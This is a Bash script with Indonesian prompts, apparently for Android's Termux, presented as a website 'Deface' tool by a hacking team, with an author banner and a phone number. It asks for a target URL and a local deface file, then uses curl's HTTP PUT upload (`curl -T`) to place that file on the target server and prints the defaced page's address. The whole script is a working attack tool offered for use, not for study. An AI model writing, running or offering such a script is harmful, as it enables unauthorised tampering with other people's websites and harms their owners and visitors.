#!/bin/bash
#version 1.0

blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
#######################################################

toilet -f slant "Deface" | lolcat

#######################################################
echo   "[=][===================================][=]" | lolcat
echo   "[=] Team     : Anteiku Nigh Raid        [=] " |lolcat
echo   "[=] Creadby  : Tuan B3T4                [=] " |lolcat
echo   "[=] Contact  : 085694011450             [=] " |lolcat
echo   "[=][===================================][=]" | lolcat
echo $red"VERSION=1"
echo $red"Nb:script deface nya agan taruh diluar folder di penyimpanan internal ya gan"
#########################################################



echo
echo    "╭─[=]B3T4[=]" Masukan Target anda |lolcat
read -p "╰─#" target
echo
echo    "╭─[=]B3T4[=]" Masukan Script anda |lolcat
read -p "╰─#" script
echo
curl -T /storage/emulated/0/$script $target
echo $blue"Tunggu..."
echo $green"Hasil deface =>$target/$script"
echo
echo $blue"Terimakasih Telah Menggunakan tools ini"
echo
echo $white"---------------------------------------"
echo $purple"                 LIST"
echo $white"---------------------------------------"
echo $red"[1].Deface"
echo $red"[2].exit"
echo $white"---------------------------------------"
echo    "╭─[=]B3T4[=]" Masukan Script anda |lolcat
read -p "╰─#" bro
echo
if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
sh Deface.sh
fi

echo
if [ $bro = 2 ] || [ $bro = 2 ]
then
echo   "[=][===================================][=]" | lolcat
echo $blue"Yakin mau keluar?"
echo   "[=][===================================][=]" | lolcat
echo    "╭─[=]B3T4[=]" Ya? |lolcat
read -p "╰─#" bro
echo
echo $red"Terimakasih Telah Menggunakan tools ini, Bila ada kekurangan dengan tool ini maaf kami akan memperbaiki by Tuan B3T4 "
echo
echo
echo
echo
echo
clear
exit
fi
